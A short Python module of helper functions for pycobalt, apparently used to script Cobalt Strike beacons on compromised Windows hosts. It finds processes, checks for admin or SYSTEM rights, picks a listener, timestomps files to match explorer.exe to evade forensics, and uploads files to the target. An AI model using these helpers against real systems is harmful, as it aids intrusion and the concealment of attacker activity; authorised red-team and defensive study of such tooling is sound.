# findprocess(bid, proc, callback)

import pycobalt.aggressor as aggressor
import pycobalt.callbacks as callbacks

def findprocess(bid, proc_name, callback):
    """
    Find processes by name. Call callback([{pid, arch}, ...]) with results.
    """
    @callbacks.callback
    def ps_callback(bid, content):
        procs = []
        for line in content.splitlines():
            (name, _, pid, arch) = line.split()
            if name == proc_name:
                procs.append({'pid': pid, 'arch': arch})

        callback(procs)

    aggressor.bps(bid, ps_callback)

def isAdmin(bid):
    """
    Check if beacon is admin (including SYSTEM)
    """
    if aggressor.isadmin(bid):
        return True

    user = aggressor.beacon_info(bid, 'user')
    if user.lower() == 'system':
        return True

    return False;

def defaultListener():
    """
    Make a semi-educated guess at which listener might be the default one
    """
    listeners = aggressor.listeners_local()

    if not listeners:
        return None

    for listener in listeners:
        if 'http' in listener:
            return listener

    return listeners[0]

def explorerstomp(bid, fname):
    """
    Stomp time with time of explorer.exe
    """
    aggressor.btimestomp(bid, fname, r'c:/windows/explorer.exe')

def uploadto(bid, local_file, remote_file):
    """
    Upload local file to specified remote destination
    """
    with open(local_file, 'r') as fp:
        data = fp.read()

    aggressor.bupload_raw(bid, remote_file, data, local_file)
